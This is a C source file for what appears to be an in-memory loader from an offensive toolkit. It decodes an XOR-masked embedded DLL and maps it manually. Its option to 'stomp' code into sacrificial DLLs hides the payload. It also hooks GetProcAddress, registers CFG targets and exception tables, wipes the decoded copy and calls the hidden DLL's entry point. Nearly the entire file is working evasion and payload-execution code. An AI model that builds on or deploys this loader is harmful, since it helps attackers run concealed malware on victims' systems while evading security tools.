#include "loader.h"
#include "stomp.h"
#include "cfg.h"

#define SAFE_FREE(ptr, size) \
    if (ptr) { \
        volatile char *vptr = (volatile char *)ptr; \
        for (size_t _i = 0; _i < size; _i++) vptr[_i] = 0; \
        KERNEL32$VirtualFree(ptr, 0, MEM_RELEASE); \
        ptr = NULL; \
    }

#define UNMASK_BUFFER(src, src_len, dst, key, key_len)            \
    do {                                                          \
        for (size_t _i = 0; _i < (size_t)(src_len); _i++) {       \
            ((unsigned char*)(dst))[_i] =                         \
                ((unsigned char*)(src))[_i] ^                     \
                ((unsigned char*)(key))[_i % (key_len)];          \
        }                                                         \
    } while (0)

static const DWORD ProtectionMap[8] = {
    PAGE_NOACCESS,          // 000: None
    PAGE_EXECUTE,           // 001: E
    PAGE_READONLY,          // 010: R
    PAGE_EXECUTE_READ,      // 011: R E
    PAGE_READWRITE,         // 100: W (mapped to RW)
    PAGE_EXECUTE_READWRITE, // 101: W E (mapped to RWX)
    PAGE_READWRITE,         // 110: R W
    PAGE_EXECUTE_READWRITE  // 111: R W E
};

DWORD GetWin32Protection(DWORD Characteristics) {
    int index = 0;
    if (Characteristics & IMAGE_SCN_MEM_EXECUTE) index |= 1;
    if (Characteristics & IMAGE_SCN_MEM_READ)    index |= 2;
    if (Characteristics & IMAGE_SCN_MEM_WRITE)   index |= 4;
    
    return ProtectionMap[index];
}

void fix_section_permissions(DLLDATA *dll, char *base_addr) {
    IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
        dll->OptionalHeader, 
        dll->NtHeaders->FileHeader.SizeOfOptionalHeader
    );

    for (WORD i = 0; i < dll->NtHeaders->FileHeader.NumberOfSections; i++, section++) {
        void *target_ptr = (void *)(base_addr + section->VirtualAddress);
        DWORD size = (section->Misc.VirtualSize > 0) ? section->Misc.VirtualSize : section->SizeOfRawData;

        if (size == 0) continue;

        DWORD new_prot = GetWin32Protection(section->Characteristics);
        DWORD old_prot = 0;

        SIZE_T region_size = (SIZE_T)size;
        NTSTATUS status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &target_ptr, &region_size, new_prot, &old_prot);
        if ( !SP_NT_SUCCESS(status) ) {
            StealthDbg("Failed: Section %-8.8s (NTSTATUS: 0x%08X)\n", section->Name, status);
            continue;
        }

        StealthDbg("Section %-8.8s | Prot: 0x%02lX | Addr: %p | size: 0x%lX\n", section->Name, new_prot, target_ptr, size);
    }

    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, base_addr, (SIZE_T)dll->NtHeaders->OptionalHeader.SizeOfImage);
}

void go(void)
{
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;
    
    /* get the pico */
    char* pico_src = GETRESOURCE(_PICO_);
    PICO* pico_dst = NULL;

#if MODE_STOMP
    RUNTIME_FUNCTION* pico_rf = (RUNTIME_FUNCTION*)KERNEL32$VirtualAlloc(NULL, MAX_PICO_FUNCS * sizeof(RUNTIME_FUNCTION), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int pico_rf_count = 0;
    PICO_ARGS picoArgs = {
        .pico_dst = &pico_dst,
        .funcs = &funcs,
        .pico_src = pico_src,
        .sacrificialDll = PICO_STOMP_DLL,
        .pico_rf_storage = pico_rf,
        .pico_rf_count = &pico_rf_count
    };
    STOMP_ARGS stompArgs = {
        .resourceType = rPICO,
        .picoArgs = picoArgs
    };
    StealthDbg("calling Stomp to load PICO code into sacrificial DLL...\n");
    if ( !Stomp(stompArgs) ) {
        StealthDbg("ERROR: Stomp failed\n");
        return;
    }
#else
    /* allocate memory for it */
    pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );
#endif
    
    EnableCFGForPICO(pico_dst, pico_src);
    /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );

    StealthDbg("setup_hooks called, proceeding to load and fixup DLL...\n");

    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );
                                                     
    /* allocate some temporary memory */
    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* unmask and copy it into memory */
    UNMASK_BUFFER(masked_dll->value, masked_dll->len, dll_src, mask_key->value, mask_key->len);

    DLLDATA dll_data;
    ParseDLL(dll_src, &dll_data);

#if MODE_STOMP
    MSVCRT$memset( &stompArgs, 0, sizeof(stompArgs) );

    char* dll_dst = NULL;
    DLL_ARGS dllArgs = {
        .dll_data = &dll_data,
        .funcs = &funcs,
        .dll_src = &dll_src,
        .dll_dst = &dll_dst,
        .sacrificialDll = DLL_STOMP_DLL
    };

    stompArgs.resourceType = rDLL;
    stompArgs.dllArgs = dllArgs;
    
    if ( !Stomp( stompArgs ) ) {
        StealthDbg("ERROR: StompDLL failed\n");
        KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
        return;
    }
    DWORD dllSize = SizeOfDLL(&dll_data);
    ULONG_PTR loaderBase = (ULONG_PTR)go;  // or any function in loader.c
    ULONG_PTR stompBase  = (ULONG_PTR)*(dllArgs.dll_dst);
    ULONG_PTR stompEnd   = stompBase + dllSize;

    StealthDbg("loader code at %p, stomp range %p-%p, overlap=%d\n", loaderBase, stompBase, stompEnd, (loaderBase >= stompBase && loaderBase < stompEnd));
#else
    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if (!dll_dst) {
        StealthDbg("ERROR: Failed to allocate memory for DLL (Error: %lu)\n", KERNEL32$GetLastError());
        SAFE_FREE(dll_src, masked_dll->len);
        return;
    }
    LoadDLL ( &dll_data, dll_src, dll_dst );

    ProcessImports ( &funcs, &dll_data, dll_dst );
#endif

    /* wipe and free the unmasked DLL copy - only dll_dst is needed from here */
    StealthDbg("about to SAFE_FREE dll_src=%p len=%u\n", dll_src, (unsigned)masked_dll->len);
    SAFE_FREE(dll_src, masked_dll->len);
    StealthDbg("SAFE_FREE done, re-parsing dll_dst=%p\n", dll_dst);
    ParseDLL(dll_dst, &dll_data);
    StealthDbg("ParseDLL done, SizeOfDLL=0x%X\n", SizeOfDLL(&dll_data));

    SET_IMAGE_INFO _sii = (SET_IMAGE_INFO)PicoGetExport(pico_src, pico_dst->code, __tag_set_image_info());
    StealthDbg("set_image_info export at %p, calling with dll_dst=%p size=0x%X\n",
        (void*)_sii, dll_dst, SizeOfDLL(&dll_data));
    _sii(dll_dst, SizeOfDLL(&dll_data));
    StealthDbg("set_image_info returned OK\n");

    StealthDbg("fixing section permissions...\n");
    fix_section_permissions(&dll_data, dll_dst);

    /* CFG must be AFTER fix_section_permissions - pages must be PAGE_EXECUTE_* */
    StealthDbg("marking CFG valid targets...\n");
    EnableCFG(&dll_data, dll_dst);

    /* Register .pdata */
    IMAGE_DATA_DIRECTORY* pExcept = &dll_data.OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (pExcept->VirtualAddress && pExcept->Size) {
        RUNTIME_FUNCTION* pFuncTable = (RUNTIME_FUNCTION*)(dll_dst + pExcept->VirtualAddress);
        DWORD funcCount = pExcept->Size / sizeof(RUNTIME_FUNCTION);
        for (DWORD i = 0; i < min(funcCount, 5); i++) {
            StealthDbg(".pdata[%d]: Begin=%08X End=%08X UnwindInfo=%08X\n",
                i, pFuncTable[i].BeginAddress, pFuncTable[i].EndAddress, pFuncTable[i].UnwindData);
        }
        if (!KERNEL32$RtlAddFunctionTable(pFuncTable, funcCount, (DWORD_PTR)dll_dst)) {
            StealthDbg("RtlAddFunctionTable failed\n");
        } else {
            StealthDbg("Registered %lu exception handlers\n", funcCount);
        }
    }

    DWORD hdr_old_protect = 0;
    //KERNEL32$VirtualProtect(dll_dst, dll_data.NtHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &hdr_old_protect);
    SIZE_T header_region_size = (SIZE_T)dll_data.NtHeaders->OptionalHeader.SizeOfHeaders;
    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID*)&dll_dst, &header_region_size, PAGE_READONLY, &hdr_old_protect);
    
    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, dll_dst, SizeOfDLL(&dll_data));

    StealthDbg("calling entry point...\n");
    DLLMAIN_FUNC entry_point = EntryPoint(&dll_data, dll_dst);
    StealthDbg("entry_point=%p  dll_dst=%p  AOE=0x%X\n",
        (void*)entry_point, dll_dst, (unsigned)dll_data.NtHeaders->OptionalHeader.AddressOfEntryPoint);

    if (entry_point) {
        entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);
        StealthDbg("DLL entry point called successfully\n");
    }

    KERNEL32$WaitForSingleObject((HANDLE)(LONG_PTR)-1, 3000);
}